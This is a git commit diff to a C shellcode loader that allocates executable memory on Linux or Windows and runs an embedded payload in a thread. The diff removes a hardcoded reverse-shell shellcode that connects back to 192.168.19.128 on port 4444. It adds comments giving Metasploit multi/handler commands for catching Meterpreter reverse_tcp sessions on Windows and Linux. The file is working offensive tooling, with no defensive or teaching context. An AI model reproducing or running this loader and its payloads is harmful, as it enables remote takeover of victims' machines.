e4e40d618daf7167450b62870d03f2fe6befab19
Sathish Bowatta <sathish.bowatta@gmail.com>
2026-05-04 13:34:29 +0200

    Update shellcode_loader.c

--- shellcode_loader.c
+++ shellcode_loader.c
@@ -1,24 +1,26 @@
+# msfconsole -qx 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; set EXITFUNC thread; run'
+# msfconsole -qx 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; run'
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <threads.h>
-#include <sys/mman.h>  // for mprotect
 
-static unsigned char buf[] = 
-"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
-"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
-"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
-"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
-"\x11\x5c\xc0\xa8\x13\x80\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
-"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
-"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
-"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
-"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
-"\x78\xed\xff\xe6";
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <sys/mman.h>
+#include <threads.h>
+#endif
+
+static unsigned char buf[] = "";
 
 
 // Thread function wrapper: casts the payload pointer to a function and calls it
+#ifdef _WIN32
+DWORD WINAPI thread_func(LPVOID arg) {
+#else
 int thread_func(void* arg) {
+#endif
     void (*func)(void) = (void (*)(void))arg;
     func();
     return 0;
@@ -27,7 +29,18 @@ int thread_func(void* arg) {
 int main() {
     size_t bufSize = sizeof(buf);
 
-    // Allocate executable memory (use mmap for guaranteed page alignment)
+    // Allocate executable memory
+#ifdef _WIN32
+    unsigned char* addr = (unsigned char*)VirtualAlloc(
+        NULL, bufSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (addr == NULL) {
+        fprintf(stderr, "Memory Allocation Failed\n");
+        return 1;
+    }
+#else
     unsigned char* addr = (unsigned char*)mmap(
         NULL, bufSize,
         PROT_READ | PROT_WRITE | PROT_EXEC,
@@ -37,21 +50,48 @@ int main() {
         fprintf(stderr, "Memory Allocation Failed\n");
         return 1;
     }
+#endif
 
     memcpy(addr, buf, bufSize);
 
-    // Flush instruction cache (important on non-x86 architectures)
+    // Flush instruction cache (GCC/Clang only, no-op on x86 but good practice on ARM)
+#ifndef _WIN32
     __builtin___clear_cache((char*)addr, (char*)addr + bufSize);
+#endif
 
+    // Create and run thread
+#ifdef _WIN32
+    HANDLE thread = CreateThread(
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)thread_func,
+        addr,
+        0,
+        NULL
+    );
+    if (thread == NULL) {
+        fprintf(stderr, "Thread Creation Failed!\n");
+        VirtualFree(addr, 0, MEM_RELEASE);
+        return 1;
+    }
+    WaitForSingleObject(thread, INFINITE);
+    CloseHandle(thread);
+#else
     thrd_t thread;
-    // Pass the function pointer via thread_func wrapper
     if (thrd_create(&thread, thread_func, addr) != thrd_success) {
         fprintf(stderr, "Thread Creation Failed!\n");
         munmap(addr, bufSize);
         return 1;
     }
-
     thrd_join(thread, NULL);
-    munmap(addr, bufSize);  // Clean up
+#endif
+
+    // Free executable memory
+#ifdef _WIN32
+    VirtualFree(addr, 0, MEM_RELEASE);
+#else
+    munmap(addr, bufSize);
+#endif
+
     return 0;
 }
